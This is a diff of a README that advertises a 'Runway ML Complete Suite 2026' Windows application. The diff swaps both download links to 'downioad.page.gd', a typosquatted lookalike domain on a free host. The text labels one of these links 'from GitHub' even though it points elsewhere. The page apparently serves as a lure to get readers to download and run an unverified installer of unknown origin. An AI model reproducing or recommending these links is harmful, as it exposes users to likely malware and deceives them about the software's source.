@@ -2,7 +2,7 @@
 
 Welcome to the Runway ML Complete Suite 2026, a comprehensive desktop application that brings the power of Runway's AI-driven creative tools directly to your Windows PC. Whether you want to generate breathtaking videos from simple text prompts, create photorealistic images, or experiment with advanced generative models, this suite has everything you need. The Runway ML Complete Suite 2026 consolidates multiple AI engines into a single, easy-to-use interface optimized for Windows 10 and Windows 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -80,7 +80,7 @@ The suite includes an automatic update checker. When a new version is available,
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
